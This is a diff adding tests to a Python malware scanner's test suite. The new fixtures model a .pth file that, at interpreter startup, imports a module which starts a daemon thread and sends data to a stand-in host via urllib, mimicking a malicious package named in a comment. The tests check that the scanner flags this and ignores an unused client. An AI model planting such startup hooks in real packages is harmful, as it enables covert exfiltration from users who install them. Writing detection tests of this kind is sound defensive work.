@@ -13332,6 +13332,47 @@ class TestWhatAPthImportsRunsAtStartup:
         )
         assert "MALWARE.INSTALL.PERSIST.001" not in found
 
+    TRANSPORT = (
+        "import urllib.request\n"
+        "class Client:\n"
+        "    def __init__(self, dsn):\n"
+        "        self.dsn = dsn\n"
+        "    def initialize(self):\n"
+        "        self._flush_loop()\n"
+        "    def _flush_loop(self):\n"
+        "        urllib.request.urlopen(self.dsn, b'facts')\n"
+    )
+
+    def test_a_send_reached_through_an_instance_at_startup(self, tmp_path) -> None:
+        # tinkoff_cloud_apis_internal 8.5.4: a thread target builds a Client whose methods send.
+        found = self.scan(
+            tmp_path,
+            {
+                "telemetry.pth": "import _telemetry_init\n",
+                "_telemetry_init.py": (
+                    "import threading\n"
+                    "from _telemetry_transport import Client\n"
+                    "def _bootstrap():\n"
+                    "    client = Client('https://t.example.invalid/e')\n"
+                    "    client.initialize()\n"
+                    "threading.Thread(target=_bootstrap, daemon=True).start()\n"
+                ),
+                "_telemetry_transport.py": self.TRANSPORT,
+            },
+        )
+        assert "MALWARE.INSTALL.STARTUP_NETWORK.001" in found
+
+    def test_a_client_class_nothing_builds_at_startup_is_not(self, tmp_path) -> None:
+        found = self.scan(
+            tmp_path,
+            {
+                "lib.pth": "import _lib\n",
+                "_lib.py": "from _telemetry_transport import Client\n__all__ = ['Client']\n",
+                "_telemetry_transport.py": self.TRANSPORT,
+            },
+        )
+        assert "MALWARE.INSTALL.STARTUP_NETWORK.001" not in found
+
     def test_a_pth_line_that_changes_the_process(self, tmp_path) -> None:
         found = self.scan(tmp_path, {"pkg-setup.pth": "\n\nimport os; os.umask(0)\n"})
         assert "MALWARE.INSTALL.STARTUP_CODE.001" in found
